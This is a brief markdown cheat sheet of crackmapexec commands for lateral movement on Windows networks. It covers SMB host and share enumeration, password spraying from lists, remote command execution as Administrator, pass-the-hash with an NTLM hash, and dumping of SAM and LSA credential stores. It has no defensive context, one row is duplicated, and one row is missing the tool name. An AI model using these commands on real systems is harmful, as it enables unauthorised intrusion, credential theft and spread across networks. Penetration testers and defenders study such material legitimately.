### lateral movement
| for Example |
| -------------|
| crackmapexec 192.168.100.1/24 |
| crackmapexec cme-hosts.txt --shares |
| cme-hosts.txt -u username.txt -p password.txt --shares |
|crackmapexec 192.168.100.10 -u Administrator -p 'Passw0rd!' -x "net users" |
| crackmapexec smb 192.168.100.1/24 -u Administrator -p 'Passw0rd!' -x "net users" |
| crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -x "hostname" |
| crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -x "hostname" |
| crackmapexec smb 192.168.100.10 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 --sam            |
| crackmapexec smb 192.168.100.10 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 --lsa             |
